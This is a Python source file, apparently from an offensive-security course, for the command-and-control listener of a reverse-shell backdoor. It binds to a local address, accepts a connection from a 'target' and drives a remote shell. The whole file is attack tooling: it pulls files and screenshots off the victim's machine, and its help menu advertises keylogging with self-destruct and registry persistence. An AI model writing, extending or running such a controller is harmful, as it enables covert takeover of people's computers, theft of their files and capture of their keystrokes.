import socket
# pip3 install termcolor
import termcolor
import json
import os


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def upload_file(file_name):
    f = open(file_name, 'rb')  # Read as bytes, since we need to send Byte data
    target.send(f.read())  # Read the file in bytes and send


def download_file(file_name):
    f = open(file_name, 'wb')  # Open file for writing in bytes
    target.settimeout(1)  # so we can get the end of file
    chunk = target.recv(1024)  # Receive first 1024 bytes of data
    while chunk:  # While we got data
        f.write(chunk)  # Reconstruct that byte data to our new file
        try:
            chunk = target.recv(1024)  # Try to get more byte, if yes (write), if no (wait for 1 sec and raise timeout exc)
        except socket.timeout as e:  # If timeout is < 1 break loop
            break
    target.settimeout(None)  # set timeout back to None (as empty) so not to affect other socket objects
    f.close()  # successfully retrieved file - then close file


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % count, 'wb')  # Open file for writing in bytes
            target.settimeout(3)  # so we can get the end of file
            chunk = target.recv(1024)  # Receive first 1024 bytes of data
            while chunk:  # While we got data
                f.write(chunk)  # Reconstruct that byte data to our new file
                try:
                    chunk = target.recv(1024)  # Try to get more byte, if yes (write), if no (wait for 1 sec and raise timeout exc)
                except socket.timeout as e:  # If timeout is < 1 break loop
                    break
            target.settimeout(None)  # set timeout back to None (as empty) so not to affect other socket objects
            f.close()  # successfully retrieved file - then close file
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                    --> Quit session with the target
            clear                                   --> Clear the screen
            cd <directory_name>                     --> Changes directory on target system
            upload <file_name>                      --> Upload file from target machine
            download <file_name>                    --> Download file from target machine
            screenshot                              --> Takes a screenshot of target machine
            keylog_start                            --> Start the Keylogger
            keylog_dump                             --> Print Keystroke that the target inputted
            keylog_stop                             --> Stop and Self-Destruct Keylogger file
            persistence <RegName> <FileName>        --> Create Persistence in Registry'''), 'green')
        else:
            result = reliable_recv()
            print(result)


# Address Family of the Socket is IPv4 and TCP
# AF_INET = IPv4 address and SOCK_STREAM = create a tcp connection (2-way connection)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Then we bind the above object with our ip and port
# Make sure the port is not in use
sock.bind(('10.0.2.15', 5555))
print(termcolor.colored('[+] Listening for the incoming connections', 'green'))
# The (5) in the sock.listen states that we want to listen
# for 5 connections, However we are going to manage only 1
# if we get only one incoming connection
sock.listen(5)
# var target = socket descriptor (which will be used in further COMMs)
# var ip = will hold ip and port from where the connection is coming from
target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))
target_communication()
